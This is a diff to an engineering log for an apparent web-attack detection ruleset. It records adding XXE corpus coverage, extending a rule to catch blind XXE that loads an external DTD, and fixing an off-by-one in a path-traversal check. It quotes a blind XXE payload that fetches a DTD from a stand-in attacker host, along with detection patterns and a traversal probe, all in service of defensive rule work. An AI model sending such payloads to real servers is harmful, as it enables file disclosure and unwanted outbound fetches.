@@ -2634,3 +2634,39 @@ against CRS's 89.7% with FPs unchanged at 0/12, and the workload went 14.8µs ->
 **A gate that is red every day is one nobody reads.** 20µs is the measured
 number plus the project's own 5% margin, so it holds today and still trips on a
 real regression. `make slo` is green for the first time.
+
+## XXE had a rule and no corpus class
+
+Adding external-DTD cases made the coverage guard reject them: `"xxe"` was not
+in `declaredClasses` at all. **The rule had existed with zero corpus coverage**,
+which is precisely the hole-one-level-up that list was created to prevent -- the
+check cannot see a class nobody named. Declared at 6 and the cases written.
+
+## Blind XXE: the request declares no entity
+
+Rule 4005 matched `<!entity`, `<!element`, `%remote;`, `<!attlist` -- the
+payload that declares its own entity. Three of four corpus misses declare none:
+
+    <!DOCTYPE foo SYSTEM "http://attacker/x.dtd">
+    <foo>&e1;</foo>
+
+The entity lives in the fetched DTD, so the request is a *reference* rather than
+a declaration and carries no literal to find.
+
+**SYSTEM only, not PUBLIC**, and the reason is XHTML: every XHTML document opens
+with `PUBLIC "-//W3C//DTD XHTML 1.0..." "http://www.w3.org/..."`, so matching
+PUBLIC would block a paste or upload of one on the first deploy. One corpus miss
+(CVE-2019-2616) uses PUBLIC with a forged public identifier and stays missed;
+catching it needs an allowlist of well-known DTD hosts, and **naming the gap
+beats shipping a list that goes stale silently**.
+
+## An off-by-one hid a whole traversal shape
+
+`repeatedTraversal` looped while `i+2 < len(v)`, so a ".." *ending* the value
+was never examined: "category=../.." counted one level and fell below the bar.
+A ".." at the end is still a segment -- it walks a level and names no file,
+which is what a directory-listing probe looks like.
+
+The separator *before* it is what keeps the fix narrow: without that test,
+"report..final.pdf" and "v1.2..v1.3" would end in segments they do not contain.
+Both are in the benign corpus now.
